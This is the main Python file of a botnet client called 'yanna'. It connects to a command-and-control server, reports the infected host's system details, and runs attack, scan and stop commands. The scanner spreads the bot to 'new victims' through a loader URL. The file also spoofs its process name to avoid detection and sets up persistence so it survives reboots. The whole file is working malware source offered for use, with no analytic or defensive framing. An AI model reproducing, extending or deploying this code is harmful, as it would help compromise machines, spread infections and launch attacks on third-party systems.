# bot/main.py

import socket
import threading
import time
import json
import platform
import uuid

# Import local modules
import utils
import attacks
import scanner

# --- Configuration ---
# IMPORTANT: Change this to your C2 server's public IP address
C2_HOST = 'YOUR_C2_SERVER_IP' 
C2_PORT = 4444

# --- Global State ---
# Generate a unique ID for this bot based on the MAC address
bot_uid = f"yanna-{''.join(f'{uuid.getnode():012x}')}"
current_task_thread = None

def send_to_c2(sock, data):
    """Encrypts and sends a JSON payload to the C2 server."""
    try:
        encrypted_payload = utils.encrypt(json.dumps(data))
        if encrypted_payload:
            sock.send(encrypted_payload.encode('utf-8'))
        return True
    except (socket.error, BrokenPipeError):
        return False

def get_system_info():
    """Gathers basic system information for the C2."""
    return {
        "uid": bot_uid,
        "os": platform.system(),
        "release": platform.release(),
        "hostname": socket.gethostname()
    }

def handle_c2_command(command_str):
    """Parses and executes commands received from the C2."""
    global current_task_thread
    
    try:
        command = json.loads(command_str)
        action = command.get("action")
        params = command.get("params", {})
        
        print(f"[*] Received action: {action} with params: {params}")

        # Stop any currently running task (attack or scan)
        if current_task_thread and current_task_thread.is_alive():
            attacks.stop_all_attacks()
            scanner.stop_scanner()
            current_task_thread.join(timeout=3)

        if action == "attack":
            current_task_thread = attacks.launch_attack(
                method=params.get("method"),
                ip=params.get("ip"),
                port=params.get("port"),
                duration=params.get("duration")
            )
        elif action == "scan":
            # The loader_url is where this bot script is hosted for new victims
            scanner.start_scanner(params.get("loader_url"))
            current_task_thread = scanner.scanner_thread # Keep track of the scanner thread
            
        elif action == "stop":
            # The stop command has already been handled above, just print a confirmation
            print("[*] All tasks have been stopped by C2 command.")

    except json.JSONDecodeError:
        print(f"[!] Malformed JSON received from C2: {command_str}")
    except Exception as e:
        print(f"[!] Error handling command: {e}")

def c2_connection_loop():
    """The main loop for connecting to C2 and handling communication."""
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"[*] Attempting to connect to C2 at {C2_HOST}:{C2_PORT}...")
            client.connect((C2_HOST, C2_PORT))
            print(f"[+] Connected to C2. Bot UID: {bot_uid}")

            # Initial check-in with system info
            check_in_payload = {
                "status": "check-in",
                "data": get_system_info()
            }
            if not send_to_c2(client, check_in_payload):
                raise socket.error("Failed to send check-in.")

            # Listen for commands
            while True:
                encrypted_data = client.recv(8192).decode('utf-8')
                if not encrypted_data:
                    break # Connection closed by C2
                
                decrypted_command = utils.decrypt(encrypted_data)
                if decrypted_command:
                    handle_c2_command(decrypted_command)
                else:
                    print("[!] Received undecryptable message from C2.")

        except Exception as e:
            print(f"[!] Connection to C2 failed or was lost: {e}")
            # Stop any running tasks if connection is lost
            if current_task_thread and current_task_thread.is_alive():
                attacks.stop_all_attacks()
                scanner.stop_scanner()
        finally:
            client.close()
            time.sleep(30) # Wait 30 seconds before trying to reconnect

if __name__ == "__main__":
    # 1. Spoof process name for evasion
    utils.spoof_process_name()
    
    # 2. Establish persistence to survive reboots
    # Run in a separate thread so it doesn't block the main C2 connection
    persistence_thread = threading.Thread(target=utils.establish_persistence, daemon=True)
    persistence_thread.start()
    
    # 3. Connect to the C2 server and start the main loop
    c2_connection_loop()
